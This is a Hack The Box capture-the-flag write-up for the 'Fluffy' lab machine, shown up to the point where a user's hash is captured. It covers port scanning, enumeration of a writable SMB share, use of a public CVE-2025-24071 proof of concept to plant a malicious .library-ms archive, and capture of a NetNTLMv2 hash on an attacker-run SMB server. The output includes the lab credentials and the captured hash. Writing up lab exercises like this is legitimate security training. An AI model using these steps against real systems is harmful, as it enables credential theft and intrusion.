<p class="indent-paragraph">  
This write-up details the end-to-end compromise of the <code>Fluffy</code> machine on Hack The Box. Starting with network reconnaissance and service enumeration, it demonstrates gaining initial access via SMB, exploiting a Windows File Explorer spoofing vulnerability to capture NTLM hashes, leveraging Kerberos for domain mapping, abusing Active Directory Certificate Services for shadow credential injection, and ultimately seizing full Administrator control through credential forging and extraction. Each phase builds on the last—culminating in a successful SYSTEM shell and flag retrieval.  
</p>


<p class="indent-paragraph">
Below is the achievement badge earned upon completing this machine, validating the successful exploitation of all required objectives.
</p><br>

<div style="text-align: center; margin-top: 1em;">
  <a href="https://www.hackthebox.com/achievement/machine/1007551/662" target="_blank" style="text-decoration: none; font-family: monospace; background: #0f0f0f; color: #00bfff; padding: 6px 12px; border: 1px solid #00bfff; border-radius: 6px; display: inline-block;">Fluffy Badge</a>
</div><br>

---
<br><p class="indent-paragraph">
As is common in real life Windows pentests, you will start the <code>Fluffy</code> box with credentials for the following account: 
<span class="blue">j.fleischman</span>:<span class="red">J0elTHEM4n1990!</span>
</p>


### 🧩 Enumeration and Initial Access

<p class="indent-paragraph">
An initial <code>full-TCP SYN</code> scan against all 65 535 ports (with host discovery disabled and a timing template of T4) confirmed that the target is alive and exposing a suite of Windows domain services. Open ports include <code>DNS</code> (53), <code>Kerberos</code> (88/464), <code>NetBIOS/SMB</code> (139/445), <code>LDAP</code> (389/636), <code>RPC/WS-Management</code> (593/5985), <code>AD Web Services</code> (9389), and several high ephemeral ports—all indicators of a <code>Domain Controller</code> role ready for further Active Directory enumeration.
</p>


```
~$ nmap -sS -Pn -T4 -p- <IP>

Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-26 19:56 UTC
Nmap scan report for <IP>
Host is up (0.14s latency).
Not shown: 65516 filtered tcp ports (no-response)

PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49685/tcp open  unknown
49686/tcp open  unknown
49689/tcp open  unknown
49704/tcp open  unknown
49719/tcp open  unknown
49746/tcp open  unknown
```

<p class="indent-paragraph">
The SMB share enumeration on the DC01 host revealed the default administrative shares <code>ADMIN$</code> and <code>C$</code>, the <code>IPC$</code> share for remote IPC access, as well as <code>NETLOGON</code> and <code>SYSVOL</code> for domain logon and policy distribution. Of particular interest was the <code>IT</code> share, which was granted both read and write permissions—offering a potential avenue to upload or exfiltrate sensitive files from the domain controller.
</p>

```
~$ nxc smb <ip> -u j.fleischman -p 'J0elTHEM4n1990!' --shares         
SMB         <ip>     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)
SMB         <ip>     445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990! 
SMB         <ip>     445    DC01             [*] Enumerated shares
SMB         <ip>     445    DC01             Share           Permissions     Remark
SMB         <ip>     445    DC01             -----           -----------     ------
SMB         <ip>     445    DC01             ADMIN$                          Remote Admin
SMB         <ip>     445    DC01             C$                              Default share
SMB         <ip>     445    DC01             IPC$            READ            Remote IPC
SMB         <ip>     445    DC01             IT              READ,WRITE      
SMB         <ip>     445    DC01             NETLOGON        READ            Logon server share 
SMB         <ip>     445    DC01             SYSVOL          READ            Logon server share 
```

<p class="indent-paragraph">
Since we now know the domain is <span class="blue">FLUFFY.HTB</span> and the hostname of the controller is simply<code>DC</code><span class="codefix">,</span> it’s a safe bet that<code>dc.fluffy.htb</code> will resolve internally. Adding this entry to our local resolver will allow us to refer to the domain controller by name instead of IP, which comes in handy when dealing with SMB, Kerberos, and other AD protocols. 
</p>

```
~$ nano /etc/hosts

<IP>   dc.fluffy.htb
```

### 🪪 SMB Enumeration

<p class="indent-paragraph">
Here we authenticate to the “IT” share on the domain controller using <code>smbclient</code> and the credentials we discovered. After connecting, we run <code>dir</code> to enumerate the contents and spot two interesting archives and an <code>Upgrade_Notice.pdf</code>. By issuing <code>get Upgrade_Notice.pdf</code>, we download the file to our local machine for further analysis. 
</p>

```
~$ smbclient //dc.fluffy.htb/IT -U=j.fleischman%'J0elTHEM4n1990!' -W FLUFFY.HTB
Try "help" to get a list of possible commands.

smb: \> dir
  .                                   D        0  Tue Jun 24 13:08:22 2025
  ..                                  D        0  Tue Jun 24 13:08:22 2025
  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 15:08:44 2025
  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 15:04:05 2025
  KeePass-2.58                        D        0  Fri Apr 18 15:08:38 2025
  KeePass-2.58.zip                    A  3225346  Fri Apr 18 15:03:17 2025
  Upgrade_Notice.pdf                  A   169963  Sat May 17 14:31:07 2025

		5842943 blocks of size 4096. 2218600 blocks available

smb: \> get  Upgrade_Notice.pdf
getting file \Upgrade_Notice.pdf of size 169963 as Upgrade_Notice.pdf (172.5 KiloBytes/sec) (average 172.5 KiloBytes/sec)
```

<p class="indent-paragraph">
The <code>Upgrade_Notice.pdf</code> isn’t just a notice—it’s a vulnerability assessment report for the domain controller. It catalogs six recent CVEs, including two critical flaws (CVE-2025-24996, CVE-2025-24071), two high-severity issues (CVE-2025-46785, CVE-2025-29968), one medium (CVE-2025-21193) and one low-severity finding (CVE-2025-3445). These entries point to immediate patching and configuration changes needed to harden the environment against known exploits.
</p>
<div style="margin-top: 20px;">
  <img src="/img/redteam/htb/fluffy/fluffy-Upgrade_Notice.png" alt="Upgrade Notice" style="width: 100%; max-width: 100%; border: 1px solid #444; border-radius: 4px;" />
</div>

<p class="indent-paragraph">
  To verify the OS without sifting through all the port details, we filter the Nmap output for its aggressive OS guess below. This focused approach immediately confirms the domain controller is a Windows host—most likely Windows Server 2019 or Windows 10 (1903–21H1).
</p>

```
~$ nmap -O dc.fluffy.htb | grep -E 'OS guesses' 

Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
```

<p class="indent-paragraph">
To exploit <code>CVE-2025-24071</code>, you can use the public PoC at 
<a href="https://github.com/ThemeHackers/CVE-2025-24071" target="_blank">ThemeHackers/CVE-2025-24071</a>. It abuses Windows Explorer’s automatic parsing of <code>.library-ms</code> files by packing a malicious SMB path inside a RAR/ZIP. When the archive is extracted, Explorer sends an NTLM authentication request to the attacker-controlled server, leaking the user’s hash.
</p>

```
~$ git clone https://github.com/ThemeHackers/CVE-2025-24071.git

Cloning into 'CVE-2025-24071'...
remote: Enumerating objects: 14, done.
remote: Counting objects: 100% (14/14), done.
remote: Compressing objects: 100% (13/13), done.
remote: Total 14 (delta 1), reused 0 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (14/14), 8.81 KiB | 2.20 MiB/s, done.
Resolving deltas: 100% (1/1), done.

~$ cd CVE-2025-24071

~$ python3 -m venv venv

~$ source ./venv/bin/activate

~$ pip install -r requirements.txt
```

<p class="indent-paragraph">
  Once executed, the exploit creates the <code>.library-ms</code> payload, bundles it into <code>exploit.zip</code>, and cleans up any temporary files. You then host <code>exploit.zip</code> over SMB (or another delivery method) and wait for the victim to extract it—this triggers an automatic SMB authentication to your listener, capturing the NTLM hash for subsequent Pass-the-Hash or relay attacks.
</p>

```
~$ python3 exploit.py -i <VPN> -f exploit                  
    
Creating exploit with filename: exploit.library-ms
Target IP: <VPN>

Generating library file...
✓ Library file created successfully

Creating ZIP archive...
✓ ZIP file created successfully

Cleaning up temporary files...
✓ Cleanup completed

Process completed successfully!
✓ Output file: exploit.zip

Run this file on the victim machine and you will see the effects of the vulnerability such as using ftp smb to send files etc.
```

<p class="indent-paragraph">
  Next, you’ll spin up an SMB server pointing at your payload directory and push the <code>exploit.zip</code> to the target’s share. This lets the victim machine automatically download and extract the library file, triggering the vulnerable behavior.
</p>

```
~$ mkdir shares
~$ mv exploit.zip shares/

~$ smbclient //dc.fluffy.htb/IT -U=j.fleischman%'J0elTHEM4n1990!' -c "put exploit.zip"

putting file exploit.zip as \exploit.zip (0.8 kb/s) (average 0.8 kb/s)
```

<p class="indent-paragraph">
By standing up an SMB listener via Impacket’s <samp>impacket-smbserver</samp> and waiting for the victim to connect, we successfully captured the NTLM hash of the account <strong>p.agila</strong>. This hash can now be subjected to offline cracking or relay attacks to further compromise the FLUFFY.HTB domain.
</p>

```
~$ sudo impacket-smbserver share ./shares -smb2support
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (<VPN>,55491)
[*] AUTHENTICATE_MESSAGE (FLUFFY\p.agila,DC01)
[*] User DC01\p.agila authenticated successfully
[*] p.agila::FLUFFY:aaaaaaaaaaaaaaaa:ccf939947879f1314cf5f90b4f37ddaf:0101000000000000007f759edce4db01d266c473c229b8e8000000000100100041004e0073004e0069007500690070000300100041004e0073004e0069007500690070000200100058005700470065007600760063004900040010005800570047006500760076006300490007000800007f759edce4db010600040002000000080030003000000000000000010000000020000046a754fa62c0ada3cb48fdccac49fe5761de1598b12df2753f4ace5cd69968650a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310035002e00350031000000000000000000
```




